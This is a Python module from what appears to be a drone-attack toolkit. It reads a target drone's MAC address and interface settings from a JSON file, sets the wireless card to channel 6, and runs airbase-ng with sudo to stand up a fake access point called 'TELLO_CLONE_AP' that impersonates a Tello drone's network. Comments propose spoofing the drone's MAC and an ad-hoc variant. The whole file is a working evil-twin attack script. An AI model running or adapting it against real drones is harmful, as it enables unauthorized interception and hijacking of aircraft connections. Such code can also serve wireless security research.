import os
import sys
import json
import subprocess
import importlib.util

# Add project root to Python path to resolve imports
project_root = os.path.join(os.path.dirname(__file__), '..', '..')
sys.path.insert(0, project_root)

# Load sudo_exec module directly to avoid loading GUI dependencies
sudo_exec_path = os.path.join(project_root, "src", "utils", "sudo_exec.py")
spec = importlib.util.spec_from_file_location("sudo_exec", sudo_exec_path)
sudo_exec_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(sudo_exec_module)
sudo_exec = sudo_exec_module.sudo_exec

##################
### PREP MODULE ##
##################

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(project_root, "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    scan_info = json.load(file)

target_info = scan_info.get("target_info", {})
target_mac = target_info.get("mac_address")
# target_channel = target_info.get("channel")
target_channel = 6 # Hardcoded channel for testing

options_info = scan_info.get("options", {})
packets = options_info.get("packets")
interface = options_info.get("interface")

# Temporary hardcoded SSID for fake AP (can be modified to read from input file if needed)
fake_ssid = "TELLO_CLONE_AP"

##################
## START MODULE ##
##################

# Targeting specific channel of target drone
sudo_exec(f"iwconfig {interface} channel {target_channel}")

# May want to use -a {target_mac} to specify BSSID of fake AP to match target drone's MAC address
# Airbase-ng command to create fake AP pretending to be drone
sudo_exec(f"airbase-ng -e {fake_ssid} -c {target_channel} {interface}")

# Potential alternative command to create ad-hoc network
# sudo_exec(f"airbase-ng --ad-hoc -a {target_mac?} -c {target_channel} {interface}")
